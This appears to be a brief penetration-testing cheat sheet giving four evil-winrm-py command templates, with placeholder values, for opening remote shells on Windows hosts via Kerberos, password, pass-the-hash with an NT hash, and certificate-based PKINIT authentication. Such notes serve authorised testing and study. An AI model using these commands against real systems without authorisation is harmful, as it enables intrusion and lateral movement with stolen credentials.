# winrm

#winrm
## evil-winrm - kerberos auth
```
evil-winrm-py -i "<dc_fqdn>" -r "<domain>"
```

## evil-winrm - hash auth
```
evil-winrm-py -i "<target_ip>" -u "<user>" -H "<nt_hash>" 
```

## evil-winrm - normal auth
```
evil-winrm-py -i "<target_ip>" -u "<user>" -p "<password>" 
```

## evil-winrm - pkinit auth
```
evil-winrm-py -i "<target_ip>" -u "<user>" -H "<nt_hash>"  --pub-key <public-key> --priv-key <private-key>
```
